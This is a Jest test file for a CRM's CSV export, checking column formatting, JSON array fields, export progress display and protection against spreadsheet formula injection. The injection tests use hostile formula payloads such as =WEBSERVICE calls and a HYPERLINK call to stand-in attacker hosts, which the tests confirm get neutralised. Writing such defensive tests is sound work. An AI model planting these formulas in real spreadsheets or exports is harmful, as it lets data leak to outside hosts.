import { type FieldMetadata } from '@/object-record/record-field/ui/types/FieldMetadata';
import { type ColumnDefinition } from '@/object-record/record-table/types/ColumnDefinition';
import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/constants/CsvInjectionPreventionZwj';

import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';
import {
  displayedExportProgress,
  generateCsv,
} from '@/object-record/record-index/export/hooks/useRecordIndexExportRecords';

jest.useFakeTimers();

describe('generateCsv', () => {
  it('generates a csv with formatted headers', async () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Foo',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'foo' },
      },
      {
        label: 'Empty',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'empty' },
      },
      {
        label: 'Nested link field',
        size: 150,
        type: FieldMetadataType.LINKS,
        metadata: { fieldName: 'nestedLinkField' },
      },
      {
        label: 'Relation',
        size: 120,
        type: FieldMetadataType.TEXT,
        metadata: {
          fieldName: 'relation',
          relationType: RelationType.MANY_TO_ONE,
        },
      },
    ];
    const rows = [
      {
        id: '1',
        bar: 'another field',
        empty: null,
        foo: 'some field',
        nestedLinkField: {
          __typename: 'Links',
          primaryLinkUrl: 'https://www.test.com',
          secondaryLinks: [
            { label: 'secondary link 1', url: 'https://www.test.com' },
            { label: 'secondary link 2', url: 'https://www.test.com' },
          ],
        },
        relation: 'a relation',
      },
    ];
    const csv = generateCsv({ columns, rows });
    expect(csv)
      .toEqual(`Id,Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation
1,some field,,https://www.test.com,"[{""label"":""secondary link 1"",""url"":""https://www.test.com""},{""label"":""secondary link 2"",""url"":""https://www.test.com""}]",a relation`);
  });

  it('generates csv with multi-select and array fields as JSON arrays', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Tags',
        size: 120,
        type: FieldMetadataType.MULTI_SELECT,
        metadata: { fieldName: 'tags' },
      },
      {
        label: 'Skills',
        size: 150,
        type: FieldMetadataType.ARRAY,
        metadata: { fieldName: 'skills' },
      },
    ];

    const rows = [
      {
        id: '1',
        name: 'John Doe',
        tags: '["DISTRIBUTOR","IMPLEMENTATION"]',
        skills: '["JavaScript","TypeScript","React"]',
      },
      {
        id: '2',
        name: 'Jane Smith',
        tags: '["PARTNER"]',
        skills: '["Python","Django"]',
      },
    ];

    const csv = generateCsv({ columns, rows });

    expect(csv).toContain('[""DISTRIBUTOR"",""IMPLEMENTATION""]');
    expect(csv).toContain('[""JavaScript"",""TypeScript"",""React""]');
    expect(csv).toContain('[""PARTNER""]');
    expect(csv).toContain('[""Python"",""Django""]');

    expect(csv).not.toContain('{"0":"DISTRIBUTOR","1":"IMPLEMENTATION"}');
    expect(csv).not.toContain(
      '{"0":"JavaScript","1":"TypeScript","2":"React"}',
    );

    expect(csv).toContain('Id,Name,Tags,Skills');
    expect(csv).toContain('1,John Doe');
    expect(csv).toContain('2,Jane Smith');
  });

  it('generates csv with empty multi-select and array fields as empty JSON arrays', () => {
    const columns: Pick<
      ColumnDefinition<FieldMetadata>,
      'size' | 'label' | 'type' | 'metadata'
    >[] = [
      {
        label: 'Name',
        size: 100,
        type: FieldMetadataType.TEXT,
        metadata: { fieldName: 'name' },
      },
      {
        label: 'Tags',
        size: 120,
        type: FieldMetadataType.MULTI_SELECT,
        metadata: { fieldName: 'tags' },
      },
      {
        label: 'Skills',
        size: 150,
        type: FieldMetadataType.ARRAY,
        metadata: { fieldName: 'skills' },
      },
    ];

    const rows = [
      {
        id: '1',
        name: 'John Doe',
        tags: '[]',
        skills: '[]',
      },
    ];

    const csv = generateCsv({ columns, rows });

    expect(csv).toContain('[]');

    expect(csv).toContain('Id,Name,Tags,Skills');
    expect(csv).toContain('1,John Doe,[],[]');
  });

  describe('CSV Injection Prevention with ZWJ', () => {
    it('prevents formula injection with equals sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Name',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'name' },
        },
        {
          label: 'Formula',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'formula' },
        },
      ];

      const rows = [
        {
          id: '1',
          name: 'Test User',
          formula: '=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain(
        '1,Test User,=WEBSERVICE("http://attacker.com")',
      );
      expect(csv).toContain(
        `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
      );
    });

    it('prevents formula injection with plus sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Calculation',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'calculation' },
        },
      ];

      const rows = [
        {
          id: '1',
          calculation: '+1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+1+1`);
      expect(csv).not.toContain('1,+1+1');
    });

    it('prevents formula injection with minus sign using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Calculation',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'calculation' },
        },
      ];

      const rows = [
        {
          id: '1',
          calculation: '-1+1',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}-1+1`);
      expect(csv).not.toContain('1,-1+1');
    });

    it('prevents formula injection with at symbol using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Reference',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'reference' },
        },
      ];

      const rows = [
        {
          id: '1',
          reference: '@SUM(1,1)',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`);
      expect(csv).not.toContain('1,@SUM(1,1)');
    });

    it('prevents formula injection with tab character using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Data',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'data' },
        },
      ];

      const rows = [
        {
          id: '1',
          data: '\t=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\t=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain('1,\t=WEBSERVICE("http://attacker.com")');
    });

    it('prevents formula injection with carriage return using ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Data',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'data' },
        },
      ];

      const rows = [
        {
          id: '1',
          data: '\r=WEBSERVICE("http://attacker.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}\r=WEBSERVICE(""http://attacker.com"")`,
      );
      expect(csv).not.toContain('1,\r=WEBSERVICE("http://attacker.com")');
    });

    it('handles multiple injection attempts in different fields with ZWJ prefix', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Field1',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field1' },
        },
        {
          label: 'Field2',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field2' },
        },
        {
          label: 'Field3',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'field3' },
        },
      ];

      const rows = [
        {
          id: '1',
          field1: '=WEBSERVICE("http://evil.com")',
          field2: '+SUM(A1:A10)',
          field3: '-HYPERLINK("http://malicious.com")',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://evil.com"")`,
      );
      expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+SUM(A1:A10)`);
      expect(csv).toContain(
        `${CSV_INJECTION_PREVENTION_ZWJ}-HYPERLINK(""http://malicious.com"")`,
      );

      expect(csv).not.toContain('1,=WEBSERVICE("http://evil.com")');
      expect(csv).not.toContain(',+SUM(A1:A10)');
      expect(csv).not.toContain(',-HYPERLINK("http://malicious.com")');
    });

    it('preserves legitimate content that does not start with dangerous characters', () => {
      const columns: Pick<
        ColumnDefinition<FieldMetadata>,
        'size' | 'label' | 'type' | 'metadata'
      >[] = [
        {
          label: 'Name',
          size: 100,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'name' },
        },
        {
          label: 'Email',
          size: 120,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'email' },
        },
        {
          label: 'Description',
          size: 200,
          type: FieldMetadataType.TEXT,
          metadata: { fieldName: 'description' },
        },
      ];

      const rows = [
        {
          id: '1',
          name: 'John Doe',
          email: 'john@example.com',
          description:
            'This is a normal description with = and + symbols in the middle',
        },
      ];

      const csv = generateCsv({ columns, rows });

      expect(csv).toContain('John Doe');
      expect(csv).toContain('john@example.com');
      expect(csv).toContain(
        'This is a normal description with = and + symbols in the middle',
      );
    });
  });
});

describe('displayedExportProgress', () => {
  it.each([
    [undefined, undefined, 'percentage', 'Export'],
    [20, 50, 'percentage', 'Export (40%)'],
    [0, 100, 'number', 'Export (0)'],
    [10, 10, 'percentage', 'Export (100%)'],
    [10, 10, 'number', 'Export (10)'],
    [7, 9, 'percentage', 'Export (78%)'],
  ])(
    'displays the export progress',
    (exportedRecordCount, totalRecordCount, displayType, expected) => {
      expect(
        displayedExportProgress({
          exportedRecordCount,
          totalRecordCount,
          displayType: displayType as 'percentage' | 'number',
        }),
      ).toEqual(expected);
    },
  );
});
